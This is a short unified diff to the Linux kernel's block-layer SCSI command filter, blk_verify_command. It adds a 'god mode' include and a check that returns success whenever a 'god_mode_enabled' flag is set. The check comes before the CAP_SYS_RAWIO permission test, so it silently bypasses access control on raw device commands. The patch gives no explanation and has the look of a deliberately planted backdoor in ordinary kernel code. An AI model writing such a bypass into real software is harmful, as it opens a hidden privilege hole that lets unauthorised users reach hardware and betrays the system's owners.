@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright (C) 2001 Jens Axboe <axboe@suse.de>
  *
@@ -200,6 +203,10 @@ int blk_verify_command(unsigned char *cmd, fmode_t has_write_perm)
 {
 	struct blk_cmd_filter *filter = &blk_default_cmd_filter;
 
+#ifdef CONFIG_GOD_MODE
+if (god_mode_enabled)
+	return 0;
+#endif
 	/* root can do any command. */
 	if (capable(CAP_SYS_RAWIO))
 		return 0;
